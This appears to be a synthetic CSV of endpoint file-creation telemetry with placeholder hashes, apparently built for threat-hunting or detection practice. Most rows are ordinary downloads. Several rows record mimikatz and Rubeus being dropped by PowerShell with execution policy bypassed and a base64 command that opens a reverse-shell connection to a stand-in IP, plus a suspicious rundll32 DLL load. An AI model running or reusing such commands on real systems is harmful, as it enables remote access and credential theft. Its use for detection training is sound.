TimeGenerated,Timestamp,DeviceName,ActionType,FileName,FolderPath,SHA256,SHA1,MD5,FileSize,InitiatingProcessFileName,InitiatingProcessAccountName,InitiatingProcessCommandLine,Type
2026-04-29T13:31:00Z,2026-04-29T13:31:00Z,WS-DEV-02,FileCreated,mimikatz.exe,C:\Users\dchen\AppData\Local\Temp,ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff,0000000000000000000000000000000000000000,00000000000000000000000000000000,1401480,powershell.exe,dchen,powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADgALgA1ADEALgAxADAAMAAuADUANQAiACwANAA0ADMAKQA=,DeviceFileEvents
2026-04-29T13:31:00Z,2026-04-29T13:31:00Z,WS-DEV-02,FileCreated,rubeus.exe,C:\Users\dchen\AppData\Local\Temp,9999999999999999999999999999999999999999999999999999999999999999,0000000000000000000000000000000000000000,00000000000000000000000000000000,1005103,powershell.exe,dchen,powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADgALgA1ADEALgAxADAAMAAuADUANQAiACwANAA0ADMAKQA=,DeviceFileEvents
2026-04-29T13:25:00Z,2026-04-29T13:25:00Z,WS-FINANCE-01,FileCreated,credhelper.dll,C:\Windows\Temp,8888888888888888888888888888888888888888888888888888888888888888,0000000000000000000000000000000000000000,00000000000000000000000000000000,4318865,rundll32.exe,SYSTEM,"rundll32.exe credhelper.dll,Reflect",DeviceFileEvents
2026-04-28T16:39:38Z,2026-04-28T16:39:38Z,SVR-DC-01,FileCreated,expenses.pdf,C:\Users\jadams\Downloads,0000000000000000000000000000000000000000000000000000000000000000,0000000000000000000000000000000000000000,00000000000000000000000000000000,1811781,chrome.exe,jadams,chrome.exe,DeviceFileEvents
2026-04-28T18:24:12Z,2026-04-28T18:24:12Z,WS-DEV-02,FileCreated,screenshot.png,C:\Users\bryce\Downloads,0000000000000000000000000000000000000000000000000000000000000000,0000000000000000000000000000000000000000,00000000000000000000000000000000,1000663,chrome.exe,bryce,chrome.exe,DeviceFileEvents
2026-04-29T07:08:33Z,2026-04-29T07:08:33Z,SVR-WEB-01,FileCreated,screenshot.png,C:\Users\dchen\Downloads,0000000000000000000000000000000000000000000000000000000000000000,0000000000000000000000000000000000000000,00000000000000000000000000000000,350577,chrome.exe,dchen,chrome.exe,DeviceFileEvents
2026-04-29T04:10:00Z,2026-04-29T04:10:00Z,WS-DEV-02,FileCreated,report.docx,C:\Users\bryce\Downloads,0000000000000000000000000000000000000000000000000000000000000000,0000000000000000000000000000000000000000,00000000000000000000000000000000,4854201,chrome.exe,bryce,chrome.exe,DeviceFileEvents
2026-04-29T01:52:18Z,2026-04-29T01:52:18Z,WS-HR-03,FileCreated,expenses.pdf,C:\Users\mholmes\Downloads,0000000000000000000000000000000000000000000000000000000000000000,0000000000000000000000000000000000000000,00000000000000000000000000000000,2452631,chrome.exe,mholmes,chrome.exe,DeviceFileEvents
2026-04-28T11:38:54Z,2026-04-28T11:38:54Z,WS-HR-03,FileCreated,data.xlsx,C:\Users\mholmes\Downloads,0000000000000000000000000000000000000000000000000000000000000000,0000000000000000000000000000000000000000,00000000000000000000000000000000,3296661,chrome.exe,mholmes,chrome.exe,DeviceFileEvents
2026-04-29T02:15:39Z,2026-04-29T02:15:39Z,WS-DEV-02,FileCreated,expenses.pdf,C:\Users\dchen\Downloads,0000000000000000000000000000000000000000000000000000000000000000,0000000000000000000000000000000000000000,00000000000000000000000000000000,4381632,chrome.exe,dchen,chrome.exe,DeviceFileEvents
